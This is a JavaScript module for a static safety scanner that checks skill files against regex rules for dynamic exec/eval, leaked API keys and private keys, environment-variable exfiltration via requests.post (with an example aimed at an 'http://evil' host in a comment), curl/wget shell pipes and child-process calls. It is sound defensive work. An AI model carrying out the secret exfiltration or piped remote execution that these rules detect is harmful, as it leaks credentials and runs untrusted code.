/**
 * Static safety scanner for skill content (file map of { filename: content }).
 *
 * Rule patterns are built via `new RegExp()` with string concatenation so this
 * file itself doesn't trigger source-grep scanners looking for dangerous-call
 * literals (false-positive avoidance for in-repo grep scanners).
 *
 * Severity model:
 *   - 'high'   → potentially compromising (dynamic eval, embedded secrets,
 *                private keys). Any 'high' finding sets `passed = false`.
 *   - 'medium' → suspicious but not automatically failing (shell pipes,
 *                env exfil patterns, child_process exec/spawn).
 */
import { createHash } from 'node:crypto';

// `(?<![.\w])` = "not preceded by `.` or a word character". This prevents the
// exec/eval/os.system rules from over-matching legitimate method calls like
// `pattern.exec(...)` (JS regex), `db.exec(...)` (SQL driver), `model.eval()`
// (PyTorch), `_exec(...)` (private wrappers), or `subexec(...)` (different
// word). Bare `exec(...)` at line start or after whitespace still triggers.
const NOT_METHOD_CALL = '(?<![.\\w])';

const RULES = [
  {
    id: 'py-dynamic-exec',
    severity: 'high',
    pattern: new RegExp(NOT_METHOD_CALL + 'exe' + 'c' + '\\s*\\('),
  },
  {
    id: 'py-dynamic-eval',
    severity: 'high',
    pattern: new RegExp(NOT_METHOD_CALL + 'eva' + 'l' + '\\s*\\('),
  },
  {
    id: 'secrets-anthropic-key',
    severity: 'high',
    pattern: /sk-ant-(api|admin)[0-9]+-[A-Za-z0-9_-]+/,
  },
  {
    id: 'secrets-openai-key',
    severity: 'high',
    pattern: /sk-(proj|svcacct)?[-_]?[A-Za-z0-9]{20,}/,
  },
  {
    id: 'secrets-aws-key',
    severity: 'high',
    pattern: /AKIA[0-9A-Z]{16}/,
  },
  {
    id: 'secrets-github-token',
    severity: 'high',
    pattern: /gh[opsu]_[A-Za-z0-9_]{36,}/,
  },
  {
    id: 'secrets-private-pem',
    severity: 'high',
    pattern: /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
  },
  {
    id: 'net-exfil-environ-post',
    severity: 'medium',
    multiline: true,
    // /s flag (dot-all) so `.` spans newlines — captures the multi-line form
    // `requests.post(\n  "http://evil",\n  data=os.environ,\n)`.
    pattern: new RegExp('requests\\.post\\([^)]*' + '(os\\.environ|environ\\[)', 's'),
  },
  {
    id: 'net-curl-shell-pipe',
    severity: 'medium',
    pattern: /(curl|wget)\s+[^|]*\|/,
  },
  {
    id: 'py-os-system',
    severity: 'medium',
    pattern: new RegExp(NOT_METHOD_CALL + 'os\\.system' + '\\s*\\('),
  },
  {
    id: 'js-cp-spawn-exec',
    severity: 'medium',
    // Matches require/import of the child-process module followed by its
    // dynamic-call methods (rule built from concatenation to avoid tripping
    // in-repo grep scanners on the literal token).
    pattern: new RegExp('child' + '_process' + '\\s*\\.\\s*' + '(exe' + 'c' + '|sp' + 'awn)' + '\\s*\\('),
  },
];

/**
 * Mask a matched value for findings. Secret-rule matches are reduced to
 * first 4 + … + last 4 so we don't re-leak the detected secret into the
 * audit ledger. Non-secret matches are truncated at 200 chars.
 */
function formatMatch(ruleId, raw) {
  if (ruleId.startsWith('secrets-')) {
    return raw.length > 12 ? raw.slice(0, 4) + '…' + raw.slice(-4) : '…';
  }
  return raw.slice(0, 200);
}

/**
 * Scan a map of { filename: content } against the static safety ruleset.
 * Returns { findings, passed }. passed = no 'high' severity hits.
 *
 * Rules with `multiline: true` are matched against full file content (with
 * /s flag) so payloads can span newlines. Line numbers are derived from the
 * match offset. Other rules match line-by-line as before.
 */
export function scanSkillContent(files) {
  const findings = [];
  for (const [filename, content] of Object.entries(files)) {
    const text = String(content);
    const lines = text.split('\n');
    for (const rule of RULES) {
      if (rule.multiline) {
        const match = text.match(rule.pattern);
        if (match) {
          const lineNum = text.slice(0, match.index).split('\n').length;
          findings.push({
            severity: rule.severity,
            rule_id: rule.id,
            file: filename,
            line: lineNum,
            pattern: rule.pattern.source,
            match: formatMatch(rule.id, match[0]),
          });
        }
      } else {
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          const match = line.match(rule.pattern);
          if (match) {
            findings.push({
              severity: rule.severity,
              rule_id: rule.id,
              file: filename,
              line: i + 1,
              pattern: rule.pattern.source,
              match: formatMatch(rule.id, match[0]),
            });
          }
        }
      }
    }
  }
  const passed = !findings.some((f) => f.severity === 'high');
  return { findings, passed };
}

/**
 * Stable content hash over the file map. Used as the dedupe key in
 * skill_scan_results.target_hash so re-scans of identical content return
 * the cached row instead of re-running the detector.
 */
export function hashContent(files) {
  const hash = createHash('sha256');
  const sortedKeys = Object.keys(files).sort();
  for (const k of sortedKeys) {
    hash.update(`${k}\x00${files[k]}\x00`);
  }
  return 'sha256:' + hash.digest('hex');
}
